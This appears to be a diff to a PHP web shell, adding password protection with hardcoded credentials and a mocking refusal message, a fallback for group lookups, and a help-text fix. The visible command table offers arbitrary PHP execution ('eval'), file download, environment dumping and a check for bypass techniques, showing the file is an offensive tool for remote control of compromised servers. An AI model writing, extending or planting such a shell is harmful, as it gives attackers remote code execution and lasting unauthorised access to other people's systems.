@@ -8,6 +8,40 @@
  */
 ob_end_clean();
 
+//https://www.php.net/manual/en/features.http-auth.php
+$realm = 'Restricted area';
+$users = array('poisonprince' => "poisonprince");
+
+function challenge(){
+  global $realm;
+  header('HTTP/1.1 401 Unauthorized');
+  header('WWW-Authenticate: Digest realm="'.$realm.'",qop="auth",nonce="'.uniqid().'",opaque="'.md5($realm).'"');
+  die("I tell you this my Poison Prince,\nYou'll soon be knocking on Heaven's door...");
+}
+
+if (empty($_SERVER['PHP_AUTH_DIGEST']) || (!($data = http_digest_parse($_SERVER['PHP_AUTH_DIGEST'])) || !isset($users[$data['username']]))) {
+    challenge();
+}
+
+$A1 = md5($data['username'] . ':' . $realm . ':' . $users[$data['username']]);
+$A2 = md5($_SERVER['REQUEST_METHOD'].':'.$data['uri']);
+$valid_response = md5($A1.':'.$data['nonce'].':'.$data['nc'].':'.$data['cnonce'].':'.$data['qop'].':'.$A2);
+
+if ($data['response'] != $valid_response)
+    challenge();
+
+function http_digest_parse($txt){
+    $needed_parts = array('nonce'=>1, 'nc'=>1, 'cnonce'=>1, 'qop'=>1, 'username'=>1, 'uri'=>1, 'response'=>1);
+    $data = array();
+    $keys = implode('|', array_keys($needed_parts));
+    preg_match_all('@(' . $keys . ')=(?:([\'"])([^\2]+?)\2|([^\s,]+))@', $txt, $matches, PREG_SET_ORDER);
+    foreach ($matches as $m) {
+        $data[$m[1]] = $m[3] ? $m[3] : $m[4];
+        unset($needed_parts[$m[1]]);
+    }
+    return $needed_parts ? false : $data;
+}
+
 //Fastcgi class helper (slightly modified)
 //--- BEGIN FILE COPY ---
 /**
@@ -325,7 +359,7 @@ define("COMMANDS", [
   "chkbypass" => " <-k?> : Checks common bypass techniques. Use -k to skip versions check",
   "clear" => ": Clear the console",
   "download" => " <file>: Download given file",
-  "echo" => "<what> >|>> <file>: Writes a string to a file. Creates/overwrites if '>', appends if '>>'",
+  "echo" => " <what> >|>> <file>: Writes a string to a file. Creates/overwrites if '>', appends if '>>'",
   "env" => ": Show the environment variables",
   "eval" => " <code>: Execute given PHP code",
   "help" => ": Display this",
@@ -403,6 +437,14 @@ if (!function_exists('posix_getpwuid')){
 else{
   $functions['posix_getpwuid'] = function ($x){return posix_getpwuid($x);};
 }
+
+if (!function_exists('posix_getgroups')){
+  $functions['posix_getgroups'] = function (){return ["name" => "?"];};
+}
+else{
+  $functions['posix_getgroups'] = function (){return posix_getgroups();};
+}
+
 
 if (!function_exists('ini_get')){
   if (function_exists('ini_get_all')){
@@ -1196,7 +1238,7 @@ function doId():string{
   $uinfo = $functions['posix_getpwuid'](posix_geteuid());
   $group = $functions['posix_getgrgid']($uinfo['gid'])['name'];
   $out_groups = "groups=";
-  foreach (posix_getgroups() as $grid) {
+  foreach ($functions['posix_getgroups']() as $grid) {
     $grname = $functions['posix_getgrgid']($grid)['name'];
     $out_groups .= "$grid($grname),";
   }
